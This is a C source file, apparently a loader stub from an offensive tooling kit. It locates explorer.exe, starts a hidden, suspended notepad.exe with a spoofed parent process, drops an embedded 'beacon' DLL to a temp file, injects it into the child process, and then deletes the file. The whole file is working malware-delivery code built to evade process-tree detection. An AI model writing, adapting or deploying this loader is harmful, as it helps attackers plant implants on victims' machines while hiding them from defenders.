// exe_ppid.c -- Artifact stub: PPID-spoofing process injection.
//
// Finds PARENT_NAME (explorer.exe), spawns CHILD_NAME with spoofed parent
// (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS), injects beacon via LoadLibraryW.
// In the process tree the beacon appears as a child of PARENT_NAME.

#include "../artifact.h"
#include <tlhelp32.h>

ART_DECLARE_PAYLOAD();

static const wchar_t PARENT_NAME[] = L"explorer.exe";
static const wchar_t CHILD_NAME[]  = L"notepad.exe";

static DWORD find_pid(const wchar_t *name) {
    DWORD  pid  = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    static PROCESSENTRY32W pe;

    if (snap == INVALID_HANDLE_VALUE) return 0;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

void __stdcall stub_main(void) {
    ART_RESOLVE_APIS();
    unsigned int sz = art_get_size(g_payload);
    if (!sz) ExitProcess(1);

    // Find the parent to impersonate.
    DWORD parent_pid = find_pid(PARENT_NAME);
    if (!parent_pid) ExitProcess(1);

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!hParent) ExitProcess(1);

    // Build attribute list with spoofed parent.
    SIZE_T attr_size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
    LPPROC_THREAD_ATTRIBUTE_LIST attr =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
    if (!attr) { CloseHandle(hParent); ExitProcess(1); }

    InitializeProcThreadAttributeList(attr, 1, 0, &attr_size);
    UpdateProcThreadAttribute(attr, 0,
                              PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hParent, sizeof(hParent), NULL, NULL);

    // Spawn child with spoofed parent.
    static STARTUPINFOEXW      siex;
    static PROCESS_INFORMATION pi;
    wchar_t cmd[MAX_PATH + 1];

    siex.StartupInfo.cb      = sizeof(siex);
    siex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    siex.StartupInfo.wShowWindow = SW_HIDE;
    siex.lpAttributeList     = attr;
    lstrcpyW(cmd, CHILD_NAME);

    BOOL ok = CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                             CREATE_SUSPENDED |
                             EXTENDED_STARTUPINFO_PRESENT |
                             CREATE_NO_WINDOW,
                             NULL, NULL,
                             (LPSTARTUPINFOW)&siex, &pi);

    DeleteProcThreadAttributeList(attr);
    HeapFree(GetProcessHeap(), 0, attr);
    CloseHandle(hParent);
    if (!ok) ExitProcess(1);

    // Write beacon DLL to temp.
    wchar_t tmppath[MAX_PATH + 1];
    if (!art_write_temp(tmppath, g_payload, sz)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        ExitProcess(1);
    }

    // Resume child, inject.
    ResumeThread(pi.hThread);
    WaitForInputIdle(pi.hProcess, 5000);
    art_inject_remote(pi.hProcess, tmppath);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteFileW(tmppath);
    ExitProcess(0);
}
